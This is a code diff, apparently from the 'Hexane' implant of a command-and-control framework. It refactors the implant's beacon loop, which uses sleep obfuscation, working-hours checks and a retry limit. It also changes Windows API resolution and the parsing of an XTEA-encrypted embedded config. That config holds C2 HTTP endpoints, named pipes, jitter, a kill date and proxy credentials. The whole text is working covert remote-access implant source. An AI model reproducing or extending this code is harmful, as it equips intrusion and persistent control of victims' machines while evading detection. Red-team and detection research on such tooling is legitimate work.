@@ -20,56 +20,37 @@ namespace Core {
 
         if (Ctx) {
             do {
-                if (!Ctx->Session.Checkin) {
-                    HandleTask(TypeCheckin);
-                    continue;
+                SleepObf();
+                if (!CheckTime()) {
+                    return_defer(ERROR_NOT_READY);
+                }
 
-                } else {
-                    HandleTask(TypeTasking);
+                MessageTransmit();
+                if (ntstatus != ERROR_SUCCESS) {
+                    Ctx->Session.Retry++;
 
-                    if (ntstatus != ERROR_SUCCESS) {
-                        Ctx->Session.Retry++;
-
-                        if (Ctx->Session.Retry == 3) {
-                            break;
-                        } else {
-                            continue;
-                        }
-                    } else {
-                        Ctx->Session.Retry = 0;
+                    if (Ctx->Session.Retry == 3) {
+                        break;
                     }
                 }
-            } while (TRUE);
+                else {
+                    Ctx->Session.Retry = 0;
+                }
+            }
+            while (TRUE);
         }
 
     defer:
         FreeApi(Ctx);
     }
 
-    VOID HandleTask (ULONG msgType) {
-        HEXANE
-
-        SleepObf();
-        if (!CheckTime()) {
-            return_defer(ERROR_NOT_READY);
-        }
-
-        MessageTransmit();
-        if (ntstatus != ERROR_SUCCESS) {
-            return_defer(ntstatus);
-        }
-
-        defer:
-        return;
-    }
-
     VOID ResolveApi () {
         HEXANE
 
-        UCHAR crypt32[24] = { CRYPT32 };
-        UCHAR winhttp[24] = { WINHTTP };
-        UCHAR advapi32[24] = { ADVAPI32 };
-        UCHAR iphlpapi[24] = { IPHLPAPI };
+        UCHAR crypt32[24]   = { CRYPT32 };
+        UCHAR winhttp[24]   = { WINHTTP };
+        UCHAR advapi32[24]  = { ADVAPI32 };
+        UCHAR iphlpapi[24]  = { IPHLPAPI };
 
         ULONG KERNEL32              = { };
         OSVERSIONINFOW OSVersionW   = { };
@@ -268,15 +249,13 @@ namespace Core {
         ReadConfig();
 
         defer:
-        return;
     }
 
-    VOID ReadConfig () {
+    VOID ReadConfig() {
         HEXANE
 
         PARSER Parser       = { };
-        ULONG nEndpoints    = 0;
-        BYTE InitKey[24]    = { OBF_KEY };
+        BYTE InitKey[16]    = { OBF_KEY };
 
         Ctx->LE = TRUE;
 
@@ -285,52 +264,53 @@ namespace Core {
 
         XteaCrypt(B_PTR(Parser.Handle), Parser.Length, InitKey, FALSE);
 
-        ParserMemcpy(&Parser, &Ctx->Config.Key              );
-        ParserStrcpy(&Parser, &Ctx->Config.Hostname         );
-        ParserStrcpy(&Parser, &Ctx->Config.Domain           );
-        ParserWcscpy(&Parser, &Ctx->Config.IngressPipename  );
+        ParserMemcpy(&Parser, &Ctx->Config.Key);
+        ParserStrcpy(&Parser, &Ctx->Config.Hostname);
+        ParserStrcpy(&Parser, &Ctx->Config.Domain);
+        ParserWcscpy(&Parser, &Ctx->Config.IngressPipename);
 
-        Ctx->Session.PeerId         = UnpackDword(&Parser);
-        Ctx->Config.Sleeptime       = UnpackDword(&Parser);
-        Ctx->Config.Jitter          = UnpackDword(&Parser);
-        Ctx->Config.WorkingHours    = UnpackDword(&Parser);
-        Ctx->Config.Killdate        = UnpackDword64(&Parser);
+        Ctx->Session.PeerId = UnpackDword(&Parser);
+        Ctx->Config.Sleeptime = UnpackDword(&Parser);
+        Ctx->Config.Jitter = UnpackDword(&Parser);
+        Ctx->Config.WorkingHours = UnpackDword(&Parser);
+        Ctx->Config.Killdate = UnpackDword64(&Parser);
 
-        Ctx->Config.IngressPipename         = nullptr;
-        Ctx->Transport.OutboundQueue        = nullptr;
+        Ctx->Config.IngressPipename = nullptr;
+        Ctx->Transport.OutboundQueue = nullptr;
 
 #ifdef TRANSPORT_HTTP
+        ULONG nEndpoints = 0;
         Ctx->Transport.http = (PHTTP_CONTEXT) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT));
 
-    Ctx->Transport.http->Handle     = nullptr;
-    Ctx->Transport.http->Endpoints  = nullptr;
-    Ctx->Transport.http->Headers    = nullptr;
+        Ctx->Transport.http->Handle     = nullptr;
+        Ctx->Transport.http->Endpoints  = nullptr;
+        Ctx->Transport.http->Headers    = nullptr;
 
-    ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent);
-    ParserWcscpy(&Parser, &Ctx->Transport.http->Address  );
+        ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent);
+        ParserWcscpy(&Parser, &Ctx->Transport.http->Address  );
 
-    Ctx->Transport.http->Port = UnpackDword(&Parser);
-    Ctx->Transport.http->nEndpoints = UnpackDword(&Parser);
-    Ctx->Transport.http->Endpoints = (LPWSTR*) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2));
+        Ctx->Transport.http->Port = UnpackDword(&Parser);
+        Ctx->Transport.http->nEndpoints = UnpackDword(&Parser);
+        Ctx->Transport.http->Endpoints = (LPWSTR*) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2));
 
-    for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
-        ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i]);
-    }
+        for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
+            ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i]);
+        }
 
-    Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
-    Ctx->Transport.bProxy = UnpackBool(&Parser);
+        Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
+        Ctx->Transport.bProxy = UnpackBool(&Parser);
 
-    if (Ctx->Transport.bProxy) {
-        Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;
+        if (Ctx->Transport.bProxy) {
+            Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;
 
-        ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress );
-        ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername );
-        ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword );
+            ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress );
+            ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername );
+            ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword );
 
-    } else {
-        Ctx->Transport.http->ProxyUsername = nullptr;
-        Ctx->Transport.http->ProxyPassword = nullptr;
-    }
+        } else {
+            Ctx->Transport.http->ProxyUsername = nullptr;
+            Ctx->Transport.http->ProxyPassword = nullptr;
+        }
 #endif
 #ifdef TRANSPORT_PIPE
         ParserWcscpy(&Parser, &Ctx->Config.EgressPipename);
